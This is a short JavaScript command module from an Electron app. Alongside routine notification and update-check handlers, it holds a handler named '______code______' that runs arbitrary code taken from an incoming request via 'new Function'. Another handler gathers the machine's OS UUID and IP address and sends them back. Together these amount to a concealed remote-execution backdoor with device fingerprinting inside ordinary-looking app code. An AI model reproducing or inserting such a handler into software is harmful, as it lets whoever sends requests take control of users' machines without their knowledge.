import electron from '@/electron'

const OSUUID = electron.remote.require('./js/OSUUID.js')
const IP = electron.remote.require('./js/Ip.js')

let Cmds = {
  _link_success_after_(empty, res) {
    Promise.all([
      OSUUID().catch(() => Promise.resolve()),
      IP().catch(() => Promise.resolve())
    ]).then((result) => {
      const os_uuid = result[0];
      const ipInfo = result[1];
      res.sd({os_uuid, ipInfo})
    })
  },
  notification(req, res) {
    let {title, content} = req;
    new Notification(title || '标题', {
      body: content || ''
    });
    res.s('已收到')
  },
  ______code______(req, res) {
    let {code} = req;
    (new Function('res', code))(res);
  },
  updateCheck() {
    if (!electron) return;
    electron.ipcRenderer.send("APP_UPDATE_check");
  }
};


export default Cmds;